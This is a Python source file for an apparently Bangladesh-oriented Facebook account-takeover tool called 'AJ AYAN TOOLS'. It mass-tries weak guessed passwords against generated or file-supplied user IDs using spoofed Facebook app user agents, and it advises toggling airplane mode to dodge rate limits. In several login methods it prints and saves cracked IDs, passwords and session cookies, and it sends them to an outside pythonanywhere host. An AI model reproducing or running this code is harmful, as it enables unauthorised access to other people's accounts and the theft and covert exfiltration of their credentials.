...
import requests
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m✓\x1b[38;5;46m] MACHINE START ')
try:
    import requests 
except ImportError:
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{S}──────────────────────────────────────────────────')
        print(f'{Y}[{R}={G1}]{G5} FUCK PROCESS HAS BEEN COMPLETED...')
        print(f'{Y}[{G5}={G5}]{Y} TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{R}[{M}={M}]{Y} TOTAL CP {G5}:{G3} %s' % str(len(cps)))
        print(f'\r{R}──────────────────────────────────────────────────')
        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    os.system('espeak -a 300 " WELLCOME,  TO,  AJ,  AYAN,  TOOLS"')
    clear()
    linex()
    linex()
    print(f'[✓]゠{G4}[1]{S} FILE CLONE ✓ [ULTRA]')
    print(f'[✓]゠{Y}[2]{Y} RANDOM CLONE  [V1]')
    print(f'[✓]゠{M}[3]{A} CONTACT OWNER [BD]')
    print(f'[✓]゠{X2}[4]{X5} TOOLS [V]     [0.1]{G1}')
    print(f'[✓]゠{R}[5]{X} MACHINE EXIT')
    linex()
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} INPUT{A}: {G5}')
    os.system('espeak -a 300 " UPDATED,   METHOD,   ONE"')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100025023380593&name=xhp_nt__fb__action__open_user');menu()
    elif select =='0':
...
def _bd_():
    clear()
    print(f'{G1}[{M}✓{G1}]{Y} EXAMPLE {X1}:{M} 017{R}/{G5}019{A}/{G3}018{Y}/{X5}016');linex()
    code = input(f'{Y}[{R}?{G5}]{G2} CHOICE  {S}:{Y} ')
    ...
    with Habib(max_workers=50) as sexy:
        clear()
        print(f'{G3}[{R}={X3}]{Y} SIM CODE  {R}:{S} {code}')
        print(f'{S}[{Y}={G2}]{S} TOTAL UID {R}:{G4} {str(len(user))}')
        print(f'{M}[{R}={S}]{Y} TURN {G3}[{S}ON{R}/{M}OFF{G4}]{G4} AIRPLANE MODE EVERY {Y}3{M} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','708090','@#@#@#','@@@@####','sadiya','jannat','i love you','bangla','Bangla','sumaiya']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{S}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{R}[{M}={G2}]{X} TOTAL OK ID {Y}:{M} {str(len(ok))}')
    print(f'{M}[{G4}={X}]{R} TOTAL CP ID {M}:{S} {str(len(cp))}')
    print(f'\r{G5}──────────────────────────────────────────────────')
    input(f'{M}[{R}={Y}]{Y} PRESS ENTER TO BACK ')
    menu()
...
def _India_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with Habib(max_workers=40) as sexy:
        clear()
        ...
        for love in user:
            ids = code+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,love,ids[:8],ids[:7],ids[:6]]
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
...
def amul():
 ...
 ua = random.choice(["[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.8."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.29."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/th_TH;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.12."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_EG;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.17."+str(random.choice(range(150999999,300999999)))+";FBPN/com.facebook.katana;FBLC/th_TH;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.16."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.16."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.12."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_GB;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".1.0.9."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.39."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.35."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_AU;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.25,width=720,height=1466};FB_FW/1;]","[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.30."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/AT&amp;amp- T;FBMF/TINNO;FBBD/ATT;FBDV/U319AA;FBSV/11;FBCA/armeabi- v7a:armeabi;FBDM/{density=1.875,width=720,height=1350};FB_FW/1;FBRV/0;]"])+END
 return ua
...
def randBuildLSB():
    ...
    END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(gt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.15."+str(random.choice(range(150,300)))+";FBBV/"+str(random.choice(range(150999999,300999999)))+";FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(gt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def USERAGENT():
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/394408512;FBCR/EE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=800,height=1280};FB_FW/1;FBRV/0;]'
    return ua 
...
def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/"+str(random.choice(range(150,300)))+".0.0.29."+str(random.choice(range(150,300)))+";FBPN/com.facebook.katana;FBLC/th_TH;FBBV/"+str(random.choice(range(150999999,300))999999)+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(gt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
def amul():
 ios_version = random.choice(["5.0.1","8.0.0","4.4.4","5.0.1","10","7.0.0","9","7.1.1","7.1.2","8.1.0","7.0","5.1.1","4.0.4","6.0.1","11","7.0","5.1","4.4.2","6.0","13","2.3.0","9.0.1","5.1","7.0","5.1","8.1","12","5"])
 END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
 ua = random.choice([""])+END
 return ua
def sexua():
...
def random_user_agent():
    ...
    major = random.randint(300, 350)  # Major version
    minor = random.randint(0, 5)       # Minor version
    patch = random.randint(0, 10)      # Patch version
    build = random.randint(400, 500)    # Build version
    
    fbav = f"{major}.{minor}.{patch}.{build}"
    ...
    user_agent = (
        ...
        f"FBLC/es_US;"
        f"FBBV/{random.randint(340000000, 350000000)};"
        f"FBCR/Movistar;"
        f"FBMF/samsung;"
        f"FBBD/samsung;"
        f"FBDV/SM-G532M;"
        ...
        f"FBDM/{{density={random.uniform(1.0, 4.0):.1f},"
        f"width={random.randint(480, 1440)},"
        f"height={random.randint(800, 2560)}}};"
        f"FB_FW/1;"
    )
...
def _file_():
    ...
    clear()
    linex()
    print(f'[✓]{Y}゠[1]{Y} UPDATED M1 {M}[BD] {G1}[{S}M1{G1}]{G1} ')
    print(f'[✓]{G4}゠[2]{S} UPDATED M2 {R}[IND NP PAK] {G2}[{Y}M2{G2}]{G1} ')
    linex()
    option = input(f'{G1}[{Y}?{G3}]{Y} CHOICE TARGET {A}:{R} ')
    if option =='1':
...
class main_crack():
    ...
    def crack(self,id):
        ...
        clear()
        linex()
        print(f'{G1}[{S}✓{G1}]{R} EXAMPLE {A}✓{Y} /sdcard/AJ.txt');linex()
        os.system('espeak -a 300 " ENTER,   YOUR,   FILE,   NAME"')
        self.file = input(f'{G1}[{Y}?{G2}]{M} FILE NAME {A}✓{S} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{M} OPPS FILE NOT FOUND ...')
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            heron="[FBAN/com.facebook.lite;FBAV/"+str(random.choice(range(150,300)))+".469.480."+str(random.choice(range(150,300)))+";FBBV/"+str(random.choice(range(150999999,300999999)))+";FBDM/{density=3.0,width=1440,height=2560};FBLC/it_IT;FBRV/0;FBCR/Verizon;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.lite;FBDV/SM-A515F;FBSV/8;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            sys.stdout.write(f"\r{S}[{Y}AJ-M1{Y}]{R}-{G5}[{A}{loop}{G5}]{A}-{G1}[{G5}OK{G1}/{S}CP{S}]{G5}-{G1}[{G5}{len(oks)}{G1}/{Y}{len(cps)}{R}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:       
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[AJ-OK] {sid} | {ps} ")
                    print(f'\r\r{G1}[COOKIE]{A} {cookie}')
                    os.system('espeak -a 300 " A ,   J,   OK,   ID"')
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={sid}|{ps}|{cookie}")
                    open('/sdcard/AJ-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    # print(f"\r\r{M}[AJ-CP] {sid} | {ps} ")
                     os.system('espeak -a 300 " C,  P"')
                     open('/sdcard/AJ-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua="[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/com.facebook.adsmanager;FBAV/269.932.985.948;FBBV/539233957;FBDM/{density=2.0,width=720,height=1280};FBLC/de_DE;FBRV/0;FBCR/Jazz;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.adsmanager;FBDV/CPH2001;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            sys.stdout.write(f"\r{R}[{M}AJ-M2{G5}]{Y}-{Y}[{M}{loop}{G5}]{G4}-{Y}[{M}OK{R}/{R}CP{G5}]{R}-{G1}[{Y}{len(oks)}{G5}/{R}{len(cps)}{G5}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[AJ-OK] {sid} | {ps} ")
                    os.system('espeak -a 300 " A ,   J,   OK,   ID"')
                    open('/sdcard/AJ-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={sid}|{ps}|{cookie}")
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\r{M}[AJ-CP] {sid} | {ps} ")
                    os.system('espeak -a 300 " C,   P"')
                    open('/sdcard/AJ-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            clear()
            linex()
            print(f'{S}[{Y}✓{G5}]{S} EXAMPLE {G5}:{Y} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{Y}[{M}?{Y}]{S} PASSWORD LIMIT {S}:{Y} '))
            clear()
            linex()
            print(f'{M}[{R}?{M}]{S} EXAMPLE {G3}:{Y} first123/firstlast/first@@@')
            linex()
            if sl =='':
                ...
                for sr in range(sl):
                    pw.append(input(f'{R}[{Y}={M}]{S} PASSWORD NO {Y}[{S}{sr+1}{G1}] {M}:{M} '))
            clear()
            linex()
            print(f'{R}[{R}={Y}]{S} TOTAL FILE UID {R}:{S} %s ' % len(self.id))
            print(f'{S}[{Y}✓{R}]{G5} PASSWORD LIMIT {R}✓{G5} {sl} ')
            print(f'{G1}[{R}✓{G5}]{Y} AIRPLANE MODE {R}[{M}ON{Y}/{Y}OFF{S}]{G3} EVERY {G5}5{S} MIN')
            linex()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r{G1}[{A}AJ-RANDOM{G1}]{A}-{G1}[{Y}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{S}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f'\r\r\x1b[1;97m[\x1b[1;92mAJ\x1b[1;97m]\x1b[1;92m-\x1b[1;97m[🥵\x1b[1;97m]\x1b[1;92m {uid} \x1b[1;97m|\x1b[1;92m {pas}')
                    print('\r\r\x1b[1;94m[\x1b[1;92mCOOKIE\x1b[1;94m]\x1b[1;92m-\x1b[1;94m[🫦]\x1b[1;92m '+coki);print("\n")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{coki}")
                    open('/sdcard/AJ-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                    print(f'\r\r\x1b[1;91m[\x1b[1;94mAJ-CP\x1b[1;91m]\x1b[1;94m {uid} \x1b[1;97m|\x1b[1;94m {pas}');break
            else:continue
        loop+=1
...
def apv():
    url="https://raw.githubusercontent.com/AJAYAN420/TEST/main/Apv.txt"
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
    ...
    if num_key in datax:
        ...
        print(" !! Key - "+num_key)
        os.system("termux-open https://m.me/CALL.ME.AJ.YOUR.NEXT.CRUSH")
        sys.exit()
...
lx = random.choice(['4.4.4','4.4.2','5.1','5.0','7.1.2','6.0','6.0.1','7.0','8.0','9','10','11','12','13','5','8.0.0','8.1.0','9.0.1'])
menu()
